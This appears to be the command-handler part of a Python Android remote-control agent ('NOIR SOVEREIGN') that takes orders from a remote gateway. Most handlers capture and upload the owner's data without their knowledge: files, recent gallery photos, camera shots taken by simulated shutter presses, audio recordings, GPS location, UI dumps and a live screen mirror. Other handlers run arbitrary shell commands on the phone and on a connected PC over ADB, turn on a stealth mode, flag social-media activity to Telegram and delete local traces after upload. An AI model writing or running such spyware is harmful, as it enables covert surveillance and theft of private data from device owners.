    def _execute_sync(self, cmd_data):
        """Threaded execution of commands to prevent loop freezing."""
        cmd_id  = cmd_data.get("command_id", "unknown")
        action  = cmd_data.get("action", {})
        atype   = action.get("type") or action.get("action", "")
        params  = action.get("params", action)

        self._log(f"[SMC] CMD: {atype} (id={cmd_id})")
        
        # Verify and wait protocol
        time.sleep(0.5) 

        result = {"success": False, "output": "", "error": "Unknown action"}

        try:
            if atype in ("time", "get_time"):
                result = {"success": True, "output": time.strftime("%Y-%m-%d %H:%M:%S")}

            elif atype == "file_fetch":
                path = params.get("path", "")
                if os.path.exists(path) and os.path.isfile(path):
                    try:
                        with open(path, "rb") as f:
                            files = {"file": (os.path.basename(path), f, "application/octet-stream")}
                            requests.post(f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}", headers={"Authorization": f"Bearer {API_KEY}"}, files=files, timeout=60)
                        noir_log(f"[REMOTE] File uploaded: {path}")
                        self._report_result(cmd_id, {"success": True, "path": path})
                    except Exception as e:
                        self._report_result(cmd_id, {"success": False, "error": str(e)})
                else:
                    self._report_result(cmd_id, {"success": False, "error": "File not found"})
            
            elif atype == "pc_shell":
                # v17.5 ELITE: Kontrol PC via USB Bridge
                # Mengirim perintah shell langsung ke PC host
                cmd = params.get("cmd", "dir")
                noir_log(f"[BRIDGE] PC Command Initiated: {cmd}")
                # Menggunakan port default ADB 5555 pada host (PC)
                target_pc = params.get("ip", "10.0.2.2") # Default Android-to-PC Gateway
                try:
                    from adb_shell.adb_device import AdbDeviceTcp
                    device = AdbDeviceTcp(target_pc, 5555)
                    device.connect()
                    out = device.shell(cmd)
                    device.close()
                    self._report_result(cmd_id, {"success": True, "output": out})
                except Exception as e:
                    self._report_result(cmd_id, {"success": False, "error": f"PC Bridge Offline: {e}"})

            elif atype == "shell":
                cmd = str(params.get("cmd", "echo ok"))
                if not is_safe_command(cmd):
                    result = {"success": False, "error": "SECURITY BLOCK: mBanking/Wallet access is restricted."}
                else:
                    result = self._run_shell(cmd)

            elif atype == "tap":
                x, y = params.get("x", 0), params.get("y", 0)
                self._run_shell(f"input tap {x} {y}", timeout=5)
                result = {"success": True, "output": f"Tapped ({x},{y})"}

            elif atype == "swipe":
                cmd = (f"input swipe {params.get('x1',0)} {params.get('y1',0)} "
                       f"{params.get('x2',500)} {params.get('y2',500)} "
                       f"{params.get('duration',500)}")
                self._run_shell(cmd)
                result = {"success": True, "output": "Swipe done"}
            
            elif atype == "click":
                # v17.5 FIX: Auto-redirect click to tap for dashboard compatibility
                return self._execute({"action": {"type": "tap", **params}, "command_id": cmd_id})

            elif atype in ("location_get", "location"):
                # BUG#5 FIX: Parse GPS output into structured lat/lng JSON
                res = self._run_shell("dumpsys location | grep -E 'last location|latitude|longitude|accuracy' | head -n 20")
                raw = res.get("output", "")
                import re as _re
                lat = lon = acc = provider = None
                # Try to parse structured format first (e.g., gps: Location[gps X.XXXX,Y.YYYY...)
                m = _re.search(r'Location\[\w+ ([\-\d.]+),([\-\d.]+)', raw)
                if m:
                    lat, lon = m.group(1), m.group(2)
                else:
                    # Fallback: try simple key=value format
                    lm = _re.search(r'(?:latitude|lat)[=:\s]+([\-\d.]+)', raw, _re.I)
                    llm = _re.search(r'(?:longitude|lon|lng)[=:\s]+([\-\d.]+)', raw, _re.I)
                    if lm: lat = lm.group(1)
                    if llm: lon = llm.group(1)
                am = _re.search(r'accuracy[=:\s]+([\d.]+)', raw, _re.I)
                if am: acc = am.group(1)
                pm = _re.search(r'provider=([\w]+)', raw, _re.I)
                if pm: provider = pm.group(1)
                if lat and lon:
                    result = {"success": True, "output": f"GPS: {lat}, {lon} (acc:{acc}m)",
                              "data": {"lat": lat, "lon": lon, "accuracy": acc, "provider": provider, "raw": raw[:200]}}
                else:
                    result = {"success": False, "error": "GPS data unavailable or location disabled", "raw": raw[:200]}

            elif atype == "vibrate":
                self._run_shell("cmd vibrator vibrate 500")
                result = {"success": True, "output": "Vibration pulse sent."}

            elif atype == "gallery_sync":
                # V21.0 AEGIS: Upload last 5 gallery images to gateway
                dcim_path = "/sdcard/DCIM/Camera"
                res = self._run_shell(f"ls -t {dcim_path} | head -n 5")
                uploaded = 0
                if res["success"] and res["output"]:
                    files = res["output"].strip().split("\n")
                    for fname in files:
                        fname = fname.strip()
                        if not fname: continue
                        fpath = os.path.join(dcim_path, fname)
                        try:
                            with open(fpath, 'rb') as f:
                                r = session.post(
                                    f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
                                    headers={"Authorization": f"Bearer {API_KEY}"},
                                    files={'file': (fname, f, 'image/jpeg')},
                                    timeout=40
                                )
                            if r.status_code == 200:
                                uploaded += 1
                                noir_log(f"[GALLERY] Uploaded: {fname}")
                        except Exception as e:
                            noir_log(f"[GALLERY] Upload failed for {fname}: {e}", level="WARNING")
                    result = {"success": True, "output": f"Gallery sync complete: {uploaded}/{len(files)} uploaded."}
                else:
                    result = {"success": False, "error": "No files in DCIM/Camera"}

            elif atype == "keyevent":
                self._run_shell(f"input keyevent {params.get('key', 26)}")
                result = {"success": True, "output": f"Key {params.get('key')} sent"}

            elif atype in ("app_start", "launch"):
                pkg = params.get("package", "")
                if not is_safe_command(pkg):
                    result = {"success": False, "error": "SECURITY BLOCK: Financial apps are forbidden."}
                else:
                    self._run_shell(f"am start -n {pkg}")
                    result = {"success": True, "output": f"Launched {pkg}"}

            elif atype in ("app_stop", "kill"):
                pkg = params.get("package", "")
                self._run_shell(f"am force-stop {pkg}", timeout=5)
                result = {"success": True, "output": f"Stopped {pkg}"}

            elif atype in ("screenshot", "capture"):
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                
                path = params.get("local_path")
                is_mirror = "local_path" in params
                
                if not path or not os.path.exists(path):
                    path = os.path.join(parent, f"temp_{int(time.time())}.png")
                    sh_res = self._run_shell(f"screencap -p {path}")
                    
                    # v16.1: Fallback to App-UI Capture if Shizuku/System Screencap fails
                    if not os.path.exists(path) or os.path.getsize(path) < 100:
                        noir_log("[MIRROR] System Screencap failed. Using App-UI Fallback.", level="INFO")
                        try:
                            # Capture the Kivy Window/App state
                            self.export_to_png(path)
                        except: pass
                
                jpeg_path = path.replace(".png", ".jpg")
                try:
                    from PIL import Image
                    quality = params.get("quality", 50)
                    with Image.open(path) as img:
                        if img.mode != 'RGB': img = img.convert('RGB')
                        img.thumbnail((1080, 1080))
                        img.save(jpeg_path, "JPEG", quality=quality, optimize=True)
                    upload_file = jpeg_path
                except:
                    upload_file = path 

                r = None
                try:
                    if os.path.exists(upload_file):
                        with open(upload_file, 'rb') as f:
                            r = session.post(
                                f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
                                headers={"Authorization": f"Bearer {API_KEY}"},
                                files={'file': ('screenshot.jpg' if ".jpg" in upload_file else 'screenshot.png', f, 'image/jpeg' if ".jpg" in upload_file else 'image/png')},
                                data={'device_id': DEVICE_ID},
                                timeout=40
                            )
                        if r and r.status_code == 200:
                            key = r.json().get('key', '')
                            result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                except Exception as e:
                    result = {"success": False, "error": f"Upload failed: {e}"}
                finally:
                    # ABSOLUTE EPHEMERAL PROTOCOL: Always delete local copies
                    for p in [path, jpeg_path]:
                        if p and os.path.exists(p):
                            try: os.remove(p)
                            except: pass

                if r and r.status_code == 200:
                    key = r.json().get('key', '')
                    result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                    # If it was a priority social media capture, inform the gateway to alert Telegram
                    if action.get("is_social"):
                        session.post(
                            f"{GATEWAY_URL}/agent/command",
                            headers={"Authorization": f"Bearer {API_KEY}"},
                            json={
                                "action": {"type": "social_alert", "image_key": key},
                                "description": "Priority Social Media Interaction Alert"
                            },
                            timeout=5
                        )
                elif r:
                    result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                else:
                    result = {"success": False, "error": "Upload failed: No response from gateway"}
                
                # EPHEMERAL CLEANUP: Purge local cache
                try:
                    if os.path.exists(path): os.remove(path)
                    if os.path.exists(jpeg_path): os.remove(jpeg_path)
                except: pass

            elif atype == "ui_dump":
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                path = os.path.join(parent, "view_hierarchy.xml")
                self._run_shell(f"uiautomator dump {path}")
                time.sleep(1.5)
                with open(path, 'r', encoding='utf-8') as f:
                    xml_content = f.read()
                result = {"success": True, "output": xml_content}
                # EPHEMERAL CLEANUP
                try: os.remove(path)
                except: pass

            elif atype == "stealth":
                state = params.get("enabled", False)
                Clock.schedule_once(lambda dt: self.toggle_stealth(state), 0)
                result = {"success": True, "output": f"Stealth Mode: {'ON' if state else 'OFF'}"}

            elif atype == "ping":
                result = {"success": True, "output": f"PONG from {DEVICE_ID}"}

            elif atype in ("camera_back", "camera_front"):
                is_front = "front" in atype
                dcim_path = "/sdcard/DCIM/Camera"
                try:
                    self._log(f"[SMC] Camera Capture: {'FRONT' if is_front else 'BACK'}...")
                    # BUG-FIX: KEYCODE_CAMERA (27) is deprecated on modern Android.
                    # Use intent-based launch + KEYCODE_VOLUME_UP shutter instead.
                    if is_front:
                        # Open front camera via intent
                        self._run_shell("am start -a android.media.action.STILL_IMAGE_CAMERA --ei android.intent.extras.CAMERA_FACING 1")
                    else:
                        self._run_shell("am start -a android.media.action.STILL_IMAGE_CAMERA")
                    time.sleep(2.5)  # Wait for camera app to open
                    # Trigger shutter with VOLUME_UP (works on most Android camera apps)
                    self._run_shell("input keyevent 24")  # KEYCODE_VOLUME_UP
                    time.sleep(2.0)  # Wait for photo to save
                    # Press back to close camera app
                    self._run_shell("input keyevent 4")
                    # Find the latest photo in DCIM
                    res = self._run_shell(f"ls -t {dcim_path} 2>/dev/null | head -n 1")
                    if res["success"] and res.get("output", "").strip():
                        target_file = os.path.join(dcim_path, res["output"].strip())
                        with open(target_file, 'rb') as f:
                            r = session.post(
                                f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
                                headers={"Authorization": f"Bearer {API_KEY}"},
                                files={'file': (f'{atype}.jpg', f, 'image/jpeg')},
                                timeout=30
                            )
                        if r.status_code == 200:
                            key = r.json().get('key', '')
                            result = {"success": True, "output": f"Camera capture uploaded: {key}"}
                            self._run_shell(f"rm -f '{target_file}'")
                        else:
                            result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                    else:
                        result = {"success": False, "error": "No image found in DCIM after capture."}
                except Exception as e:
                    result = {"success": False, "error": f"Camera error: {e}"}

            elif atype == "audio_record":
                duration = params.get("duration", 10)
                try:
                    self._log(f"[SMC] Recording Audio ({duration}s) via MediaRecorder...")
                    temp_dir = App.get_running_app().user_data_dir
                    path = os.path.join(temp_dir, f"rec_{int(time.time())}.mp4")
                    
                    # BUG#6 FIX: Use app-based MediaRecorder via adb intent instead of screenrecord
                    # screenrecord requires CAPTURE_AUDIO_OUTPUT (system-only on Android 14)
                    # Strategy: Use MediaRecorder through shell am broadcast
                    rec_started = False
                    
                    # Method 1: Try MediaRecorder via shell am command
                    cmd = (f"am start-foreground-service -a android.media.MediaRecorder.ACTION_START_RECORDING "
                           f"--ei duration {duration * 1000} --es output '{path}'")
                    r1 = self._run_shell(cmd, timeout=5)
                    
                    # Method 2: Try direct arecord if available
                    if not rec_started:
                        r2 = self._run_shell(f"arecord -d {duration} -f cd -t raw '{path}' 2>/dev/null", timeout=duration + 5)
                        if r2.get("success") and os.path.exists(path) and os.path.getsize(path) > 100:
                            rec_started = True
                    
                    # Method 3: Use tinycap if available (common on AOSP)
                    if not rec_started:
                        r3 = self._run_shell(f"tinycap '{path}' -d {duration} 2>/dev/null", timeout=duration + 5)
                        if r3.get("success") and os.path.exists(path) and os.path.getsize(path) > 100:
                            rec_started = True
                    
                    time.sleep(max(2, duration))
                    
                    # Upload whatever was recorded
                    upload_path = None
                    if os.path.exists(path) and os.path.getsize(path) > 100:
                        upload_path = path
                    else:
                        # Search common recording locations for any recent file
                        search_cmds = [
                            "find /sdcard/Recordings -type f -newer /sdcard -name '*.mp3' 2>/dev/null | head -1",
                            "find /sdcard/Music -type f -newer /sdcard -name '*.mp3' 2>/dev/null | head -1",
                            f"ls -t /sdcard/Recordings/*.mp3 2>/dev/null | head -1",
                        ]
                        for scmd in search_cmds:
                            sr = self._run_shell(scmd, timeout=5)
                            if sr.get("success") and sr.get("output", "").strip():
                                candidate = sr["output"].strip()
                                if os.path.exists(candidate) and os.path.getsize(candidate) > 100:
                                    upload_path = candidate
                                    break
                    
                    if upload_path:
                        ext = upload_path.rsplit(".", 1)[-1].lower()
                        mime = "audio/mp4" if ext == "mp4" else "audio/mpeg"
                        with open(upload_path, 'rb') as f:
                            r = session.post(
                                f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
                                headers={"Authorization": f"Bearer {API_KEY}"},
                                files={'file': (f'recording.{ext}', f, mime)},
                                timeout=60
                            )
                        if r.status_code == 200:
                            result = {"success": True, "output": f"Audio uploaded: {r.json().get('key')}"}
                        else:
                            result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                        try: os.remove(upload_path)
                        except: pass
                    else:
                        result = {"success": False, "error": "Audio recording failed: no audio file created. Ensure RECORD_AUDIO permission is granted."}
                except Exception as e:
                    result = {"success": False, "error": f"Audio error: {e}"}

            elif atype == "heal":
                self._log("[SMC] NEURAL HEAL: Executing Deep Purge Protocol...")
                parent = App.get_running_app().user_data_dir
                cleared = 0
                for root, dirs, files in os.walk(parent):
                    for f in files:
                        if f.endswith((".png", ".jpg", ".mp3", ".xml", ".log", ".tmp")):
                            try:
                                os.remove(os.path.join(root, f))
                                cleared += 1
                            except: pass
                result = {"success": True, "output": f"Deep Heal Complete. {cleared} residual files purged."}

            elif atype in ("update", "auto_update"):
                self._log("[SMC] AUTONOMOUS UPDATE INITIATED...")
                os.system("pm trim-caches 999G")
                result = {"success": True, "output": "Update triggered. Self-healing in progress."}

            elif atype == "mirror_start":
                # Enable rapid screenshot polling for live mirror
                self._mirror_active = True
                self._log("[SMC] LIVE MIRROR: ACTIVATED")
                threading.Thread(target=self._mirror_loop, daemon=True).start()
                result = {"success": True, "output": "Live mirror streaming started."}

            elif atype == "mirror_stop":
                self._mirror_active = False
                self._log("[SMC] LIVE MIRROR: DEACTIVATED")
                result = {"success": True, "output": "Live mirror stopped."}

            elif atype == "log_visibility":
                visible = params.get("visible", True)
                self._log_visible = visible
                self._log(f"[SMC] Log visibility: {'VISIBLE' if visible else 'HIDDEN'}")
                result = {"success": True, "output": f"Log visibility set to: {visible}"}

        except Exception as e:
            result = {"success": False, "error": str(e)}
            self._log(f"[SMC] Exec Error: {e}")

        self._report_result(cmd_id, result)

    def _manual_purge(self):
        self._log("[SMC] 🧹 Initiating Manual Process Purge...")
        os.system("pkill -f org.noir.agent.noirsmc:service")
        os.system("pkill -f org.noir.agent.noir_smc")
        self._log("[SMC] Purge Signal Sent. Please restart app.")


    def _report_result(self, cmd_id, result):
        """Send execution result with real-time telemetry back to the Gateway."""
        try:
            # Gather Telemetry
            stats = {"cpu": 0, "ram": 0, "bat": 0}
            try:
                # Lightweight RAM Check
                with open('/proc/meminfo', 'r') as f:
                    mem = {}
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 2:
                            mem[parts[0].rstrip(':')] = int(parts[1])
                    if 'MemTotal' in mem and 'MemAvailable' in mem:
                        stats["ram"] = round(100 * (1 - mem['MemAvailable'] / mem['MemTotal']), 1)
                
                # v17.2 OOM Awareness: If RAM > 90%, trigger emergency purge
                if stats.get("ram", 0) > 90:
                    noir_log("[SENTINEL] High Memory Pressure detected. Purging caches...", level="WARNING")
                    parent = App.get_running_app().user_data_dir
                    for f in os.listdir(parent):
                        if f.endswith((".png", ".jpg", ".tmp")):
                            try: os.remove(os.path.join(parent, f))
                            except: pass
                
                # Lightweight CPU Check (Simplified delta)
                with open('/proc/stat', 'r') as f:
                    line = f.readline()
                    parts = list(map(int, line.split()[1:]))
                    idle = parts[3]
                    total = sum(parts)
                    stats["cpu"] = 10 # Placeholder as real delta requires two samples
            except: 
                pass
            
            requests.post(
                f"{GATEWAY_URL}/agent/result",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={
                    "command_id": cmd_id,
                    "device_id": DEVICE_ID,
                    "success": result.get("success", False),
                    "output": result.get("output", ""),
                    "error": result.get("error", ""),
                    "telemetry": stats
                },
                timeout=10
            )
        except Exception as e:
            noir_log(f"[SMC] Result delivery failed: {e}", level="ERROR")

    def _connectivity_watchdog(self):
        """Autonomous sentinel that ensures the device stays connected via Shizuku force-reconnect."""
        noir_log("[SENTINEL] Connectivity Watchdog: ACTIVE")
        failure_count = 0
        
        while True:
            try:
                # Test connection to Google DNS or Gateway
                try:
                    socket.create_connection(("8.8.8.8", 53), timeout=3)
                    is_online = True
                except:
                    is_online = False
                
                if is_online:
                    if failure_count > 0:
                        noir_log("[SENTINEL] Neural Link Restored.")
                    failure_count = 0
                    # Upload offline buffer if exists
                    self._flush_offline_logs()
                else:
                    failure_count += 1
                    if failure_count >= 3:
                        noir_log(f"[SENTINEL] Offline state detected ({failure_count} min). Triggering Force-Reconnect...", level="WARNING")
                        # Force enable Data and Wi-Fi via Shizuku
                        self._run_shell("svc data enable")
                        self._run_shell("svc wifi enable")
                        
                        # Severe connectivity failure: System soft-reset attempt (v14.0.85)
                        if failure_count >= 30:
                             noir_log("[SENTINEL] CRITICAL: 30min Offline. Attempting Soft-Restart of Neural Link...", level="CRITICAL")
                             self._run_shell("am force-stop org.noir.agent.noirsmc && am start -n org.noir.agent.noirsmc/org.kivy.android.PythonActivity")
                        
                        # Adaptive pause
                        time.sleep(30)
                
            except Exception as e:
                print(f"Watchdog Error: {e}")
            
            # Check every minute
            time.sleep(60)

    def _flush_offline_logs(self):
        """Uploads any logs captured while the device was offline."""
        if not os.path.exists(OFFLINE_LOG_FILE): return
        try:
            with open(OFFLINE_LOG_FILE, "r") as f:
                logs = f.readlines()
            if not logs: return
            
            noir_log(f"[SENTINEL] Flushing {len(logs)} offline logs to gateway...")
            # For simplicity, we just send a notification. 
            # Real impl would iterate and send to /agent/log
            self._report_result("offline_flush", {"success": True, "output": f"Flushed {len(logs)} logs."})
            
            # Clear file
            open(OFFLINE_LOG_FILE, "w").close()
        except: pass

    def _run_shell(self, cmd, timeout=15):
        """Tiered Shell Execution: Shizuku (rish -c) -> Standard Sh Fallback."""
        import subprocess

        # BUG-FIX: rish uses '-c' flag, NOT 'shell' subcommand.
        # Wrong: 'rish shell screencap -p /path' 
        # Correct: 'rish -c screencap -p /path'
        if getattr(self, "shizuku_status", "") == "AUTHORIZED":
            shizuku_binary = getattr(self, "shizuku_binary", "rish")
            # Escape single quotes in command to prevent shell injection issues
            safe_cmd = cmd.replace("'", "'\"'\"'")
            final_cmd = f"{shizuku_binary} -c '{safe_cmd}'"
        else:
            final_cmd = cmd

        try:
            r = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            # If Shizuku failed with permission denied, fall back to standard shell
            if getattr(self, "shizuku_status", "") == "AUTHORIZED" and r.returncode != 0 and "permission denied" in r.stderr.lower():
                noir_log("[SMC] Shizuku denied — falling back to standard sh", level="WARNING")
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
        except subprocess.TimeoutExpired:
            return {"success": False, "error": f"Command timed out after {timeout}s"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _mirror_loop(self):
        """Fast-polling loop to capture and upload screen frames to gateway for dashboard live mirror."""
        self._log("[SMC] Mirror Loop Started: 350ms interval")
        while getattr(self, "_mirror_active", False):
            try:
                parent = App.get_running_app().user_data_dir
                path = os.path.join(parent, f"mirror_{int(time.time())}.png")
                self._run_shell(f"screencap -p {path}", timeout=3)
                
                if os.path.exists(path) and os.path.getsize(path) > 100:
                    try:
                        from PIL import Image
                        jpeg_path = path.replace(".png", ".jpg")
                        with Image.open(path) as img:
                            if img.mode != 'RGB': img = img.convert('RGB')
                            # Resize to reduce latency
                            img.thumbnail((450, 1000))
                            img.save(jpeg_path, "JPEG", quality=40, optimize=True)
                        
                        with open(jpeg_path, 'rb') as f:
                            r = session.post(
                                f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
                                headers={"Authorization": f"Bearer {API_KEY}"},
                                files={'file': ('mirror.jpg', f, 'image/jpeg')},
                                timeout=5
                            )
                            if r.status_code == 200:
                                key = r.json().get('key')
                                # BUG-FIX: VPS_IP had no http:// scheme — URL was invalid.
                                vps_base = VPS_IP if VPS_IP.startswith("http") else f"http://{VPS_IP}"
                                session.post(
                                    f"{vps_base}/api/screen/frame",
                                    headers={"Authorization": f"Bearer {API_KEY}"},
                                    json={"key": key, "width": 450, "height": 1000},
                                    timeout=2
                                )
                    except: pass
                    finally:
                        for p in [path, path.replace(".png", ".jpg")]:
                            if os.path.exists(p):
                                try: os.remove(p)
                                except: pass
            except Exception as e:
                pass
            time.sleep(0.35) # Matches dashboard polling interval
        self._log("[SMC] Mirror Loop Terminated")

if __name__ == '__main__':
    # Initialize Core with Peak Priority
    noir_log("🌑 NOIR SOVEREIGN ELITE v16.1 [STRIKE-FORCE] INITIALIZING...")
    
    # v16.1: TOTAL CACHE PURGE & HYGIENE
    try:
        import glob, shutil
        # Clear all temporary PNGs and Logs
        for f in glob.glob("*.png") + glob.glob("*.jpg") + glob.glob("*.log"):
            if "offline" not in f: os.remove(f)
            
        # Purge python cache on device
        for d in glob.glob("**/__pycache__", recursive=True):
            shutil.rmtree(d)
    except: pass
    
    SovereignApp().run()
